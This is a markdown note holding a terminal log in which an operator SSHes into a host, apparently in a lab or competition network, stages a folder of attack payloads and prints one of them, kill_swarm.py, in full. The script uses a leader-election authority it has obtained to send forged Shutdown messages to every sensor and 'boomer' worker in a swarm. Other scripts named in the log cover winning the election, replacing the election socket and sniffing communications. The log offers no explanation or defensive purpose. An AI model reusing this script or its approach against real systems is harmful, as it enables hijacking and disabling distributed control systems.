---
tags:
lecture:
date:
related:
aliases:
created: 2026-03-28T19:52
modified: 2026-03-28T19:52
---

# Terminal Output 3

```bash
❯ ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no operator1@sliver-69c7ea82bb324af474135496.vpn.cog

operator1@sliver-69c7ea82bb324af474135496.vpn.cog's password:
Permission denied, please try again.
operator1@sliver-69c7ea82bb324af474135496.vpn.cog's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1050-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Mar 29 00:28:03 UTC 2026

  System load:  0.0                Processes:             156
  Usage of /:   14.7% of 24.05GB   Users logged in:       3
  Memory usage: 3%                 IPv4 address for ens5: 10.96.25.91
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

11 updates can be applied immediately.
11 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Mar 28 21:20:19 2026 from 100.84.134.207
operator1@ip-10-96-25-91:~$ pwd
/home/operator1
operator1@ip-10-96-25-91:~$ ls ../../tmp
snap-private-tmp                                                        systemd-private-3085df4b76b34640825be0d9b5c1bf3f-systemd-logind.service-VQd6gP
systemd-private-3085df4b76b34640825be0d9b5c1bf3f-chrony.service-QPHqIq  systemd-private-3085df4b76b34640825be0d9b5c1bf3f-systemd-resolved.service-HWK2JE
operator1@ip-10-96-25-91:~$ cd ../../tmp
operator1@ip-10-96-25-91:/tmp$ mkdir payloads
operator1@ip-10-96-25-91:/tmp$ cd payloads
operator1@ip-10-96-25-91:/tmp/payloads$ ls
check_leader.py
operator1@ip-10-96-25-91:/tmp/payloads$ ls
check_leader.py  kill_swarm.py  replace_election_socket.py  sniff_comms.py  win_election.py
operator1@ip-10-96-25-91:/tmp/payloads$ sed -i 's/__OUR_UUID__/2959a16e-2a6b-d154-547a-10a7810e9ce0/g' payloads/*.py
sed: can't read payloads/*.py: No such file or directory
operator1@ip-10-96-25-91:/tmp/payloads$ cd ..
operator1@ip-10-96-25-91:/tmp$ sed -i 's/__OUR_UUID__/2959a16e-2a6b-d154-547a-10a7810e9ce0/g' payloads/*.py
operator1@ip-10-96-25-91:/tmp$ sed -i 's|__COMMS_SOCKET_PATH__|/run/commsDaemon/comms.sock|g' payloads/*.py
operator1@ip-10-96-25-91:/tmp$
operator1@ip-10-96-25-91:/tmp$ sed -i 's|__ELECTION_SOCKET_PATH__|/run/electionDaemon/election.sock|g' payloads/*.py
operator1@ip-10-96-25-91:/tmp$
operator1@ip-10-96-25-91:/tmp$ Claude Opus 4.6 (Medium)^C
operator1@ip-10-96-25-91:/tmp$ sed -i 's|__ELECTION_SOCKET_PATH__|/run/electionDaemon/election.sock|g' payloads/*.py
operator1@ip-10-96-25-91:/tmp$ ls
payloads                                                                systemd-private-3085df4b76b34640825be0d9b5c1bf3f-systemd-logind.service-VQd6gP
snap-private-tmp                                                        systemd-private-3085df4b76b34640825be0d9b5c1bf3f-systemd-resolved.service-HWK2JE
systemd-private-3085df4b76b34640825be0d9b5c1bf3f-chrony.service-QPHqIq
operator1@ip-10-96-25-91:/tmp$ cd payloads
operator1@ip-10-96-25-91:/tmp/payloads$ ls
check_leader.py  kill_swarm.py  replace_election_socket.py  sniff_comms.py  win_election.py
operator1@ip-10-96-25-91:/tmp/payloads$ cd /var/www && sudo python3 -m http.server 34652 &^C
operator1@ip-10-96-25-91:/tmp/payloads$ ^C
operator1@ip-10-96-25-91:/tmp/payloads$ ls
check_leader.py  kill_swarm.py  replace_election_socket.py  sniff_comms.py  win_election.py
operator1@ip-10-96-25-91:/tmp/payloads$ pwd
/tmp/payloads
operator1@ip-10-96-25-91:/tmp/payloads$ ls
check_leader.py  kill_swarm.py  replace_election_socket.py  sniff_comms.py  win_election.py
operator1@ip-10-96-25-91:/tmp/payloads$ cat kill_swarm.py
#!/usr/bin/env python3
"""kill_swarm.py - Send Shutdown to all sensors and boomers."""
import socket
import json
import sys
import base64
import time

# ============ FILL THESE IN ============
OUR_UUID = "2959a16e-2a6b-d154-547a-10a7810e9ce0"
COMMS_SOCK = "/run/commsDaemon/comms.sock"
ELECTION_SOCK = "/run/electionDaemon/election.sock"

SENSOR_UUIDS = [
    __SENSOR_LIST__
]

BOOMER_UUIDS = [
    __BOOMER_LIST__
]
# =======================================

ALL_WORKERS = SENSOR_UUIDS + BOOMER_UUIDS

# ---- Step 1: Confirm leadership ----
print("[*] Confirming leadership...")
try:
    es = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    es.connect(ELECTION_SOCK)
    coa = json.loads(es.recv(409600).decode())
    es.close()
    if len(coa.get("endorsements", [])) == 0:
        print("[!] NOT LEADER. Cannot send Shutdown.")
        print("[!] Run win_election.py first.")
        sys.exit(1)
    print(f"[+] Leader confirmed"
          f" ({len(coa['endorsements'])} endorsements)")
except Exception as e:
    print(f"[!] Cannot check leadership: {e}")
    sys.exit(1)

# ---- Step 2: Connect to comms socket ----
print("[*] Connecting to comms socket...")
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)

# ---- Step 3: Queue Shutdown for each worker ----
print(f"[*] Sending Shutdown to {len(ALL_WORKERS)} workers...")
shutdown_payload = base64.b64encode(b"{}").decode()

for worker_uuid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": worker_uuid,
        "msg": shutdown_payload,
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())
    print(f"  -> Shutdown queued for {worker_uuid[:8]}...")

# Small delay to let comms process the queue
time.sleep(1)

# ---- Step 4: Also try plain JSON msg (not base64) ----
# In case worker comms expects plain JSON for non-election
print(f"\n[*] Sending backup Shutdown with plain msg"
      f" encoding...")
for worker_uuid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": worker_uuid,
        "msg": "{}",
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())

comms.close()

print(f"\n[+] Shutdown queued for {len(ALL_WORKERS)}"
      f" workers")
print(f"    Sensors: {len(SENSOR_UUIDS)}")
print(f"    Boomers: {len(BOOMER_UUIDS)}")
print("[*] Workers will die on their next poll"
      " cycle (~1-2 seconds)")
print("[+] SWARM KILL COMPLETE")operator1@ip-10-96-25-91:/tmp/payloads$ ^C
operator1@ip-10-96-25-91:/tmp/payloads$ Read from remote host sliver-69c7ea82bb324af474135496.vpn.cog: Operation timed out
Connection to sliver-69c7ea82bb324af474135496.vpn.cog closed.
client_loop: send disconnect: Broken pipe

    ~                                                                                                                                                  255 ✘  1h 6m 28s 
```
